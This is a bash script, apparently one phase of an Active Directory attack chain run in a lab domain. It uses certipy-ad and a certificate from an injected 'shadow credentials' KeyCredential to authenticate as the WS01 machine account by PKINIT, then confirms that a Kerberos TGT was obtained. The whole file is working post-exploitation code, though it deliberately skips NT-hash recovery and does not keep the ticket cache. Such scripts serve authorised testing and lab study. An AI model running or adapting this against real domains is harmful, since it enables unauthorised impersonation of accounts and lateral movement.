#!/usr/bin/env bash
# Prove the consequence of the injected WS01 KeyCredential with certificate-backed Kerberos authentication.
# No NT hash is requested and no TGT cache is retained.
set -euo pipefail

WORK="${WORK:-$HOME/.config/kingdoms/phase03-shadow}"
PFX="$WORK/ws01-shadow.pfx"
PASSFILE="$WORK/pfx-password"
DC_IP="${DC_IP:-10.4.10.11}"
DOMAIN="${DOMAIN:-north.sevenkingdoms.local}"
USERNAME="${USERNAME:-WS01$}"

[[ -f "$PFX" ]] || { echo "FAIL: expected PFX missing: $PFX" >&2; exit 1; }
[[ -f "$PASSFILE" ]] || { echo "FAIL: PFX password file missing: $PASSFILE" >&2; exit 1; }
[[ "$(stat -Lc '%a' "$PFX")" == '600' ]] || { echo 'FAIL: PFX must be mode 600' >&2; exit 1; }
[[ "$(stat -Lc '%a' "$PASSFILE")" == '600' ]] || { echo 'FAIL: password file must be mode 600' >&2; exit 1; }

CERTIPY="$(command -v certipy-ad 2>/dev/null || true)"
[[ -n "$CERTIPY" ]] || { echo 'FAIL: certipy-ad not found' >&2; exit 1; }

PFX_PASSWORD="$(<"$PASSFILE")"
TMP="$(mktemp /tmp/kingdoms-shadow-pkinit.XXXXXX)"
trap 'rm -f -- "$TMP"' EXIT

echo '===== SHADOW CREDENTIALS PKINIT CONSEQUENCE ====='
echo "PRINCIPAL=$DOMAIN/$USERNAME"
echo "DC_IP=$DC_IP"
echo 'INFO: -no-hash prevents NT-hash recovery.'
echo 'INFO: -no-save prevents retention of the Kerberos TGT cache.'
echo

set +e
"$CERTIPY" auth   -pfx "$PFX"   -password "$PFX_PASSWORD"   -username "$USERNAME"   -domain "$DOMAIN"   -dc-ip "$DC_IP"   -no-hash   -no-save 2>&1 | tee "$TMP"
RC=${PIPESTATUS[0]}
set -e

[[ "$RC" -eq 0 ]] || { echo "FAIL: Certipy authentication returned RC=$RC" >&2; exit "$RC"; }
grep -Fq 'Got TGT' "$TMP" || {
  echo 'FAIL: Certipy returned success but no Got TGT marker was observed' >&2
  exit 1
}

echo
echo 'PHASE03_SHADOW_PKINIT_TGT=True'
echo 'PASS: certificate-backed Kerberos authentication is proven'
